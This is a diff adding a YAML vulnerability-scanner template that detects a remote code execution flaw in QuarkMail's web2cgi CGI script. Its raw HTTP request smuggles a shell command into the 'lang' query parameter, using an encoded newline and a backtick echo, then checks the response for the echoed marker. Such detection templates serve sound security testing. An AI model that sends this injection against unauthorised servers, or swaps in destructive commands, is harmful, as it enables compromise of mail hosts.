@@ -1,0 +1,25 @@
+id: quarkmail-web2cgi-rce
+
+info:
+  name: QuarkMail web2cgi Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    QuarkMail is a mail system software developed by Beijing Xiongzhi Weiye Co., Ltd. Certain versions of QuarkMail use CGI scripts, which contain a remote code execution vulnerability. Attackers can exploit this vulnerability to execute specific instructions, potentially compromising the mail server host.
+  tags: command-execution,rce
+
+http:
+  - raw:
+      - |
+        GET /cgi-bin/web2cgi/get.cgi?lang=%0Aecho%09%60echo%20608c5255daf7cf0%22%22%27%27d2c930fb1fe6377b9%60&dir=foo HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "608c5255daf7cf0d2c930fb1fe6377b9"
+
+    stop-at-first-match: true
